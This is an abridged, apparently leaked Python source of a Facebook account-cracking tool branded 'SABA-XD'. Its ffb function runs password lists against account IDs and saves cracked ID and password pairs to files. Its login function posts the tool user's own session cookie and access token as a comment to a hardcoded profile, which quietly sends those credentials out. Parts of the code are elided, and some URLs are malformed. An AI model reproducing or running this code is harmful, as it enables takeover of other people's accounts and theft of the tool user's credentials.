#SOURCE LEAKED BY : Oussama
#REASON : BECAUSE LOL BADSHAH
#WAS INTERFERE BETWEEN
#AWAIS & LKING FIGHT 😎 
from os import path
import os,base64,zlib,pip,urllib
os.system('xdg-open https://facebook.com/groups/61553656684069/')
...
def login():
        ...
        try:
                data = requests.get("https://www.facebook.com/profile.php?id=61553123983858", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": ".","origin": "https://https://www.facebook.com/profile.php?id=61553123983858","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
                ...
                requests.post('https://graph.facebook.comhttps://www.facebook.com/profile.php?id=61553123983858/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
                linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [SABA-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [SABA-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SABA-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [SABA-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SABA-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/SABA-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [SABA-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/SABA-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [SABA-OK] '+uid+' | '+pas+'\033[1;97m')
